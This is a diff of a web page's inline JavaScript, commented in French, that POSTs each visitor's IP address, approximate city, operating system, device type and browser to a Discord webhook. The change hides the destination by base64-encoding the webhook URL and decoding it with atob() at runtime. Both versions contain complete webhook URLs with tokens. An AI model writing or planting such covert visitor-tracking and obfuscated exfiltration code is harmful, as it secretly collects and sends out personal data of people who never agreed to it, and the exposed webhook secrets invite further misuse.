@@ -21,16 +21,16 @@
     <script>
         // Fonction pour envoyer les informations à un webhook Discord
         function sendToDiscord(ipAddress, city, os, deviceType, browser) {
-            var webhookURL = "https://discord.com/api/webhooks/1146140442124107838/zqeL38QIOFyhl47TZB5A6rYzrfoxQm0fMZMSPgQRNuLhNSoM0mIPZ_11LJTjCNZy2aC1"; // Remplacez par l'URL de votre webhook Discord
+            var encodedWebhookURL = "aHR0cHM6Ly9wdGIuZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzExNDY0MjY1MTQ0ODU4MjU2NTYvbElYZzhaN3JmVl9LSlFPdkFXVVZGUzZYQVN5YXAyQlM5Y2tGM3p2UlVkN2VsZ3haRWpwQ3N4eWJyN1JMUDA5UmY0S3Y="; // Encodé avec window.btoa()
 
             var content = "> **Adresse IP : **" + ipAddress + " :earth_americas:" +
-                "\n> **Ville Approximative : **" + city + " :cityscape: " +
-                "\n> **Système d'exploitation : **" + os + " :gear: " +
-                "\n> **Type de dispositif : **" + deviceType + " :computer: :mobile_phone: " +
+                "\n> **Ville : **" + city + " :cityscape:" +
+                "\n> **Système d'exploitation : **" + os + " :computer:" +
+                "\n> **Type de dispositif : **" + deviceType + " :iphone:" +
                 "\n> **Navigateur : **" + browser + " :globe_with_meridians:";
 
             var request = new XMLHttpRequest();
-            request.open("POST", webhookURL);
+            request.open("POST", atob(encodedWebhookURL)); // Utilisation de atob() pour décoder l'URL
             request.setRequestHeader('Content-type', 'application/json');
             var params = {
                 content: content
